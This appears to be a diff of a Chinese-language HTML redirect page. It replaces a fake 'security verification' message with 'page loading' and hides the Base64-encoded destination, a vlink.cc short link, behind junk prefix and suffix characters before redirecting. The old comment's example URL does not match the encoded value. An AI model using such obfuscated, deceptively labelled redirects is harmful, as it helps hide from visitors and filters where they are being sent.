@@ -2,7 +2,7 @@
 <html lang="zh">
 <head>
   <meta charset="UTF-8">
-  <title>验证中…</title>
+  <title>页面加载中...</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     html, body {
@@ -20,20 +20,20 @@
   </style>
 </head>
 <body>
-  <div>正在进行安全验证，请稍候…</div>
+  <div>页面加载中，请稍候…</div>
 
   <script>
-    // 真实跳转地址（加密后的 Base64 内容）
-    const encodedUrl = "aHR0cHM6Ly92bGluay5jYy94eHh2dnY="; // 示例加密后地址：https://vlink.cc/yxyzzb
+    // 加盐编码（前缀+Base64链接+后缀）
+    const wrapper = "keuiaHR0cHM6Ly92bGluay5jYy94eHh2dnY=kzew";
 
-    // 延迟时间（单位：毫秒）
-    const delay = 500;
+    // 解码逻辑（去除前后缀再 Base64 解码）
+    const clean = wrapper.slice(4, -4); // 移除前4位和后4位
+    const link = atob(clean);
 
-    // 解密并跳转
+    // 延迟跳转
     setTimeout(() => {
-      const targetUrl = atob(encodedUrl);
-      window.location.href = targetUrl;
-    }, delay);
+      location.href = link;
+    }, 600);
   </script>
 </body>
 </html>
